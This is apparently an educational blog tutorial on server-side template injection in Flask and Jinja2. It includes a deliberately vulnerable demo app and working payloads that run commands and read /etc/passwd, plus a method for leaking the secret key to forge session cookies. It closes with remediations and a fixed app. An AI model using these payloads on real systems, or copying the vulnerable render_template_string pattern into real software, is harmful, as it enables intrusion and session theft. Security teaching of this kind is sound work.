# An Introduction to Server-Side Template Injections with Flask

The idea of a web application template is basically what it sounds like. Imagine it is around the holidays and you are writing letters to 20+ relatives. Having to write 20+  letters to each relative eventually becomes a little tedious. Your letters may end up becoming something like this:

> Dear {relative name}, 
>
> I hope you are doing well. Happy holidays.
>
> Best regards,
>
> {your name}

Web applications use a very similar approach. When a home page displays the friendly "Hello, {your name}", it is retrieving data from the server and presenting it onto a template. An example can be seen from my school's learning management system:

![](/images/brightspace.png)

Templates are often used by developers and can be seen in many modern-day dynamic web frameworks. Some of them include:

- Flask
- Django
- Laravel
- Hugo
- AngularJS

Because of the such widespread usage, the initial discovery of template injections introduced a whole new class of vulnerabilities still being researched today.

## What are server-side template injections? (SSTIs)
Server-side template injections, or SSTIs, were first introduced by [James Kettle][PortSwigger] in 2015 and set a framework to a lot of studies and exploitation techniques still used today.

The main idea behind the attack is for a malicious user to abuse the "retrieve data from the server" mechanism, hence the "server-side" part to the name. Templating engines would render this user-input and may expose code execution to which attackers can run arbitrary commands.

Allowing user-input typically is a bad idea, but in some places it is necessary such as with forms and chat messages. The issue arises when a server renders and executes the user-input, typically triggered with a special wrapper.

## Testing for SSTI
The common payload `{{7*7}}` used in Kettle's research would, in many frameworks, return to the template `49`. You can see within the curly brackets, an equation is being put in the input. Because the server rendered the equation and not as as a normal string (for which we would expect the same input), we therefore have a form of code execution and a successful SSTI.

Other payloads with differing syntax may also include:
- `{{7*'7'}}`
- `@(7*7)`
- `${{<%[%'"}}%\.`

Some compiled lists of payloads can also be found here:
- [PayloadsAllTheThings][PayloadsAllTheThings]
- [HackTricks][HackTricks]
- [Fuzzing SSTI][Fuzzing]

Another indicator of SSTI is through finding XSS vulnerabilities depending on the framework. Because both injections cause the server to do a form of rendering, some XSS locations may also be vulnerable to SSTI and is worth testing for.

## Exploiting SSTI
So we can now calculate simple math expressions. But how do we use this to go further?

Understanding the idea that the injected code is run in an environment, we therefore have access to environmental variables.

Depending on the framework, there will be various differences such as the programming language, framework builtins, and filtering rules that may be used. Using different types of payloads as mentioned above can help with the identification of the framework used.

In this case, I will showcase the various ways of SSTI in Flask.

## Exploring Flask
Flask is a Python based framework and uses Jinja2 as its templating engine. Even though Flask itself automatically incorporates Jinja2 without it needing to be explicitly called in the code, certain filters can still be used to allow for XSS and even SSTI.

Let's take a look at a simple Flask app. The app returns user input from a POST request and passes it back through the `data` variable:

```python
# app.py
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        data = render_template_string(request.form["input"])
        return render_template("index.html", data=data) # passing the data back to the template
    return render_template("index.html")

if __name__ == "__main__":
    app.run()
```

We can create an `index.html` template in the `/templates` directory as so:

```html
<!-- templates/index.html -->
<!DOCTYPE html>
<html>
    <head>
        <title>Flask SSTI Testing</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
    </head>
    <body>
        <h1>Flask SSTI Testing</h1>
        
        <form method="POST">
            <input type="text" name="input">
            <input type="submit" value="Submit">
        </form>
        
        {% if data %}
        <h2>Raw Input:</h2>
        <p>{{ data | safe }}</p>
        {% endif %}
    </body>
</html>
```

You can see the special Jinja2 if-statement used with the curly brackets in `index.html`. As the Flask application renders the template, it checks whether the server returned a `data` variable which you can see passed in `app.py`. If so, it will then be rendered onto the page.

One vulnerable part of the code is the use of the [`render_template_string()`][Flask Templating] in `app.py`. This function essentially renders any Jinja2 syntax (such as the `{{7*7}}` payload) and returns it as a string. Do note that in this scenario, it does not cause XSS as the code is run in the backend.

Additionally, the `|` character and `safe` as seen in `index.html` is what is allowing for XSS. Though passing a simple XSS payload such as `<script>alert(1)</script>` does not contain any Jinja2 syntax, the direct string passed back to the template is being run through the [safe filter][Jinja2 Safe Filter]. This automatically escapes any string and will render on the page.

With some additional Python and HTML, an example of the different combinations is shown here:

![](/images/flask-example.png)

The following will show certain techniques found in Flask, but may also be applicable to other frameworks.

### Object Tree Traversal
By utilizing Python types, we can traverse object trees to access different types of objects. With the payload above, we already used traditional Python integers to run the code.

In Python, we can use some object properties such as `__mro__`, `__class__`, and `__subclasses__` to traverse up and down the object tree to bypass potential filters. The process on crafting a payload is shown below:

```python
>>> "" # just a string, can be declared
# ' '
>>> "".__class__ # retrieving the class object
# <class 'str'>
```

Following here, we use Python's Method Resolution Order, or MRO, to get all the classes the string class inherits. In this case, we are traversing up the object tree. As shown below, the string is both a string and an object:

```python
>>> "".__class__.__mro__
# (<class 'str'>, <class 'object'>)
>>> "".__class__.__mro__[1] # accessing just object from tuple
# <class 'object'>
```

Provided the object, we can now traverse back down to access a different class/object in the environment. This can be done with the `subclasses()` function. This returns a long list of all existing object in the environment:

```python
>>> "".__class__.__mro__[1].__subclasses()
# [<class 'type'>, <class 'weakref'>,
# ...
# <class 'apport.packaging.PackageInfo'>, <class 'gettext.NullTranslations'>]
```

From here, a useful object to obtain RCE is `subprocess.Popen`. Using the returned list from `subclasses()`, we can access the object through its index and run its normal functions to execute code.

```python
>>> ''.__class__.__mro__[1].__subclasses__()[340]('whoami', shell=True, stdout=-1).communicate()[0].strip()
# root
```

This exploit does not rely on any framework or engine builtins but is based purely on Python. This may be used in other applications such as bypassing Python sandboxes but is a neat way to execute code. Another quick example can see done with Java, using the type T can be used as a payload to run commands and would be vulnerable in Thymeleaf:
```java
${ T(java.lang.Runtime).getRuntime().exec('calc') }
```

### Using Additional Globals

Specific templating engines themselves may also include additional builtins for convenience. For example in Jinja2, there is an object called [lipsum][Jinja2 lipsum] used for generating lorem ipsum text for web developers.

Using similar concepts as before, we can shorten our payload with the use of `globals()` in Jinja2's context like this:

```python
{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
```

An additional global includes the `config` variable, which returns configured information about the server which opens new ways of attack.

Some Flask applications may use declared secret keys to create user sessions. Secret keys and other configurations are declared like so:

```python
# app.py
...
app.config['SECRET_KEY'] = os.random(16).hex()
...
```

This configuration variable declared in Flask is returned with `config`. Within the Flask context, sending the payload `{{ config }}` will return all the app's variables, including that secret key. The secret key can allow people to sign their own cookies to steal user sessions.

For example, let's take our previous application and add some session management:

```python
# app.py
from flask import Flask, render_template, request, render_template_string, session # importing Flask's builtin session

app = Flask(__name__)
app.config["SECRET_KEY"] = "supersafesecretkey" # not a safe secret key

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        session["user"] = "visitor" # everyone is assigned to visitor
        data = render_template_string(request.form["input"])

        return render_template(
            "index.html", 
            data=data, 
            user=session["user"] # retrieving "user" cookie
        )
    return render_template("index.html", user=session["user"])

if __name__ == "__main__":
    app.run()
```
```html
<!-- templates/index.html -->
<!DOCTYPE html>
<html>
    <head>
        <title>Flask SSTI Testing</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
    </head>
    <body>
        <h1>Flask SSTI Testing</h1>
        
        {% if user %}
        <h2> Hello, {{ user }}</h2>
        {% endif %}

        <form method="POST">
            <input type="text" name="input">
            <input type="submit" value="Submit">
        </form>

        {% if data %}
        <h2>Raw Input:</h2>
        <p>{{ data }}</p>

        <h2>Raw Input with Safe Filter:</h2>
        <p>{{ data | safe }}</p>
        {% endif %}
    </body>
</html>
```

Injecting the payload `{{ config }}` will return the following:

![](/images/config.png)

We can see the `SECRET_KEY` towards the beginning in the result. Attackers can use this key to sign their own cookies. This is relatively simple to do as Flask session cookies can be decoded in base64. Just as a quick note, do not store sensitive information in cookies!

An example of the cookie provided by the server is as so:
```
eyJ1c2VyIjoidmlzaXRvciJ9.YzERnQ.SXvlg2yhbXbb3eL2ecPzNSrfHMQ
```
Decoding the sections provided results in:
```
{"user":"visitor"}c1X6m/g?3R
```
An attacker can determine the session values used in the application and control the value. The extra bytes after the JSON is the signature encoded with the time and secret key.

Using both the secret key from the injection and the session structure, an attacker can then create a dummy Flask server, modify the session-token value, and send the forged token back to the original server.

Attackers may also attempt to bruteforce the secret key. Some open-source tools can even be found on Github which can help with this process:

- https://github.com/Paradoxis/Flask-Unsign
- https://github.com/Tagvi/ripsession

This is just one example how SSTI can lead to other vulnerabilities in a Flask application.

## Remediations
Besides the two explicit vulnerabilities declared in the first dummy app above, often in the real world there is a lot more code. This may make it a bit difficult to perform a full security audit to catch mistakes seen above. It is important though to keep in mind of techniques for preventing SSTIs.

### Sandboxing
By placing your web application in a sandbox, it would help restrict attacks who execute SSTI from having full permissions on your system. Make sure it is running in a safe environment.

For example, if you have an application running in a Docker container, you may include a `USER` declaration to prevent the container from running as `root`.

```Dockerfile
# Dockerfile
USER manager
```

Even if an attacker obtains code execution, they would be limited to the permissions assigned to `manager`.

### Sanitizing
User-input should always be sanitized as it is the most common attack vector. Anywhere from input forms, query parameters, and chat features. Special characters as seen with above `{`, `$`, and `@` are examples of things to look out for in other frameworks.


### Fixed Application
If we recall, the current use of `render_template_string` from Flask and the safe filter from Jinja2 both introduce XSS and SSTI vulnerabilities. Removing the two would result in a fixed version of the application as shown below:
```python
# app.py

import os # used to generate a secure secret key
from flask import Flask, render_template, request, session # remove `render_template_string`

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(64)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        session["user"] = "visitor"
        data = request.form["input"]

        return render_template(
            "index.html", 
            data=data, 
            user=session["user"]
        )
    return render_template("index.html", user=session["user"])

if __name__ == "__main__":
    app.run()
```
```html
<!-- templates/index.hml -->
<!DOCTYPE html>
<html>
    <head>
        <title>Flask SSTI Testing</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/water.css">
    </head>
    <body>
        <h1>Flask SSTI Testing</h1>
        
        {% if user %}
        <h2> Hello, {{ user }}</h2>
        {% endif %}

        <form method="POST">
            <input type="text" name="input">
            <input type="submit" value="Submit">
        </form>

        <!-- Remove safe filter! -->
        {% if data %}
        <h2>User Input:</h2>
        <p>{{ data }}</p> 
        {% endif %}
    </body>
</html>
```

## Conclusion
In conclusion, server-side template injections are a still relatively new injection type that was wide applications. The multitude of web frameworks that utilize their own custom templates and templating engines change frequently and come with their own set of unique exploits. It is best to beware and be on the lookout on SSTIs.

<!-- References -->
[PortSwigger]: https://portswigger.net/research/server-side-template-injection
[PayloadsAllTheThings]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
[HackTricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
[Fuzzing]: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt
[Flask Templating]: https://flask.palletsprojects.com/en/2.2.x/templating/
[Jinja2 Safe Filter]: https://jinja.palletsprojects.com/en/3.1.x/templates/#working-with-automatic-escaping
[Jinja2 lipsum]: https://jinja.palletsprojects.com/en/2.11.x/templates/#lipsum